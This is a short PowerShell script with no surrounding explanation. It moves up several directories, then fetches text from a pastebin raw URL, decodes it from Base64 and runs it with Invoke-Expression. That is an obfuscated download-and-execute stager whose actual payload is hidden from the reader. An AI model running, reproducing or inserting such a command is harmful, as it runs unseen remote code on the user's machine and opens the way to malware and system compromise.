cd ..\..\..\..\..\..\
Invoke-Expression -Command  $([string]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-WebRequest -Uri https://pastebin.com/raw/1JDNWfqP).content))))

